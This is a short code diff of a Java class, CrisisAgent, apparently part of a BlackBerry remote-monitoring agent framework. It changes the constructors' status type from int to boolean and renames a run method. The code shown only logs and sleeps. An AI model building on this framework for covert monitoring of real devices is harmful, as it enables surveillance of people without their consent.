@@ -6,16 +6,16 @@ import com.ht.rcs.blackberry.utils.DebugLevel;
 public class CrisisAgent extends Agent {
     static Debug debug = new Debug("CrisisAgent", DebugLevel.VERBOSE);
 
-    public CrisisAgent(int agentStatus) {
+    public CrisisAgent(boolean agentStatus) {
         super(Agent.AGENT_CRISIS, agentStatus, true);
     }
 
-    protected CrisisAgent(int agentStatus, byte[] confParams) {
+    protected CrisisAgent(boolean agentStatus, byte[] confParams) {
         this(agentStatus);
         parse(confParams);
     }
 
-    public void agentRun() {
+    public void actualRun() {
         debug.trace("run");
         this.sleepUntilStopped();
 
